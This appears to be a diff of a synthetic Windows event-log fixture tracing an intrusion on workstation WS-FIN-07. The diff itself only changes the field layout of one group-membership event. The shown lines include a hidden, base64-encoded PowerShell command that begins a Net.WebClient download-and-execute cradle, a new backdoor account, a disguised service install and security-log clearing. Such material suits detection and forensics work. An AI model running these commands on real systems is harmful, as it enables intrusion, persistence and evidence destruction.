@@ -9,7 +9,7 @@
 {"TimeCreated": "2026-11-14T01:46:00Z", "EventID": 4624, "Computer": "WS-FIN-07", "TargetUserName": "Administrator", "IpAddress": "203.0.113.200", "LogonType": 10}
 {"TimeCreated": "2026-11-14T01:48:00Z", "EventID": 4688, "Computer": "WS-FIN-07", "SubjectUserName": "Administrator", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"}
 {"TimeCreated": "2026-11-14T01:49:00Z", "EventID": 4720, "Computer": "WS-FIN-07", "SubjectUserName": "Administrator", "TargetUserName": "svc_backup"}
-{"TimeCreated": "2026-11-14T01:49:10Z", "EventID": 4732, "Computer": "WS-FIN-07", "SubjectUserName": "Administrator", "TargetUserName": "svc_backup", "TargetGroupName": "Administrators"}
+{"TimeCreated": "2026-11-14T01:49:10Z", "EventID": 4732, "Computer": "WS-FIN-07", "SubjectUserName": "Administrator", "TargetUserName": "Administrators", "MemberName": "-", "MemberSid": "S-1-5-21-1004336348-1177238915-682003330-1003"}
 {"TimeCreated": "2026-11-14T01:51:00Z", "EventID": 7045, "Computer": "WS-FIN-07", "ServiceName": "WinUpdateHelper"}
 {"TimeCreated": "2026-11-14T01:55:00Z", "EventID": 1102, "Computer": "WS-FIN-07", "SubjectUserName": "Administrator"}
 {"TimeCreated": "2026-11-14T09:04:50Z", "EventID": 4624, "Computer": "WS-FIN-07", "TargetUserName": "bob", "IpAddress": "192.0.2.14", "LogonType": 3}
